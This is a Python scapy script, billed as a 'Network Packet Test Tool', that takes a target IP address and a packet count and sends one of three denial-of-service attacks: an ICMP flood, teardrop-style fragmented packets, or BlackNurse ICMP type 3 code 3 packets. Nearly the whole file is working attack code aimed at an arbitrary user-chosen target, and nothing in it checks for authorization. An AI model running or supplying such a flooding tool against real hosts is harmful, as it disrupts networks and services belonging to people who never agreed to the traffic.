import logging
import time
import os
import sys
from scapy.all import IP, ICMP, send, conf, get_if_list, get_if_addr, sr1
import warnings

# Silence warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

PAYLOAD = "ping"

if os.geteuid() != 0:
    print("[-] Please run this script as root (use sudo).")
    sys.exit(1)

def get_user_input(prompt, valid_options=None, default=None):
    while True:
        value = input(prompt).strip()
        if not value and default is not None:
            return default
        if valid_options and value not in valid_options:
            print(f"[!] Invalid input. Valid options are: {valid_options}")
        elif value:
            return value

def list_active_interfaces():
    print("Active interfaces (with IPv4 addresses):")
    active_ifaces = []
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip != "0.0.0.0":
                print(f"- {iface} : {ip}")
                active_ifaces.append(iface)
        except Exception:
            # Interface might not have IP or be down
            continue
    return active_ifaces

def send_flood(dst_ip, src_ip, iface, count):
    print(f"[+] Sending {count} ICMP packets from {src_ip} to {dst_ip} on interface {iface}")
    pkt = IP(src=src_ip, dst=dst_ip) / ICMP() / PAYLOAD
    send(pkt * count, iface=iface)

def send_teardrop(dst_ip, src_ip, iface, count):
    print(f"[+] Sending teardrop-like packets from {src_ip} to {dst_ip}")
    pkt = IP(src=src_ip, dst=dst_ip, flags="MF", proto=17, frag=0) / ICMP() / PAYLOAD
    send(pkt * count, iface=iface)

def send_blacknurse(dst_ip, src_ip, iface, count):
    print(f"[+] Sending BlackNurse packets from {src_ip} to {dst_ip}")
    pkt = IP(src=src_ip, dst=dst_ip) / ICMP(type=3, code=3)
    send(pkt * count, iface=iface)

def main():
    print("=== Network Packet Test Tool ===")

    dst_ip = get_user_input("Target IP address: ")

    n_msg = int(get_user_input("Messages to send: "))

    active_ifaces = list_active_interfaces()
    if not active_ifaces:
        print("[-] No active interfaces found with valid IP addresses.")
        sys.exit(1)

    iface = get_user_input(f"Interface to use (choose from above): ", valid_options=active_ifaces)

    local_ip = get_if_addr(iface)
    print(f"\n[+] Using local IP {local_ip} as source IP for all packets")

    print("\nSelect attack type:")
    print("1) Flood\n2) Teardrop\n3) Black Nurse")
    attack_type = get_user_input("Your choice (1/2/3): ", valid_options=["1", "2", "3"])

    print(f"\n[+] Sending {n_msg} packets from {local_ip} to {dst_ip} on interface {iface}...\n")

    start_time = time.time()

    try:
        if attack_type == "1":
            send_flood(dst_ip, local_ip, iface, n_msg)
        elif attack_type == "2":
            send_teardrop(dst_ip, local_ip, iface, n_msg)
        elif attack_type == "3":
            send_blacknurse(dst_ip, local_ip, iface, n_msg)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    duration = time.time() - start_time
    speed = n_msg / duration if duration > 0 else 0

    print("\n=== Simulation Complete ===")
    print(f"Time elapsed: {duration:.2f} seconds")
    print(f"Total packets sent: {n_msg}")
    print(f"Approx. speed: {speed:.2f} packets/sec")
    
if __name__ == "__main__":
    main()
